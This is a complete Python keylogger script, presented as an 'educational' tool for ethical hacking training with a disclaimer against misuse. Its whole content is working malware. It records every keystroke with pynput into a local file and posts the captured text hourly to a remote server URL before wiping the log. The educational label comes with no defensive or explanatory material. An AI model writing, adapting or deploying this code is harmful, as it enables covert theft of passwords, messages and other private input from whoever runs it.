# -*- coding: utf-8 -*-
"""
Educational Keylogger - For Cybersecurity Awareness & Ethical Hacking Training
Author: Farouk
License: MIT
Disclaimer: This script is for educational purposes only. Do not use it for malicious activities.
"""

import requests
import threading
from pynput.keyboard import Key, Listener

# Server URL to send logged keystrokes
SERVER_URL = "http://your-server.com/logs"  # Replace with your actual server URL

def write_to_file(key):
    """
    Logs keystrokes into 'log.txt' after filtering unnecessary keys.
    """
    try:
        keydata = str(key).replace("'", "")

        # Handling special keys
        if key == Key.space:
            keydata = ' '
        elif key == Key.enter:
            keydata = '\n'
        elif key in (Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r):
            keydata = ''  # Ignoring modifier keys

        # Append keystrokes to log file
        with open('log.txt', 'a') as f:
            f.write(keydata)
    
    except Exception as e:
        print(f"Error: {e}")

def send_logs():
    """
    Reads 'log.txt' and sends its contents to the server every hour.
    """
    try:
        with open("log.txt", "r") as f:
            logs = f.read()
        
        if logs.strip():  # Send only if the file contains data
            response = requests.post(SERVER_URL, data={"logs": logs})
            if response.status_code == 200:
                print("Logs sent successfully!")
                open("log.txt", "w").close()  # Clear the log file after sending
            else:
                print(f"Failed to send logs, status code: {response.status_code}")
    
    except Exception as e:
        print(f"Error sending logs: {e}")

    # Schedule the function to run again after one hour
    threading.Timer(3600, send_logs).start()

# Start sending logs in intervals
send_logs()

# Start the keylogger
with Listener(on_press=write_to_file) as listener:
    listener.join()
